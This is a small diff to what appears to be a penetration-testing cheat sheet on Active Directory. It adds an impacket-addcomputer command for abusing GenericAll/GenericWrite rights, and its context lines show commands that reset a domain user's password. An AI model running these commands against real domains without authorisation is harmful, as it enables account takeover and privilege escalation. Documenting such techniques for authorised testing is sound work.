@@ -78,6 +78,12 @@ impacket-changepasswd $DOMAIN/target_user@$DC_IP -newpass 'NewPass123!' \
     -authuser $USER -authpassword $PASS
 ```
 
+### GenericAll / GenericWrite on Computer 
+
+```bash
+impacket-addcomputer -computer-name 'SomeName$' -computer-pass 'SomePassword' -dc-host "$DC_HOST" -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
+```
+
 ```powershell
 # Net command (if you have local access)
 net user target_user NewPass123! /domain
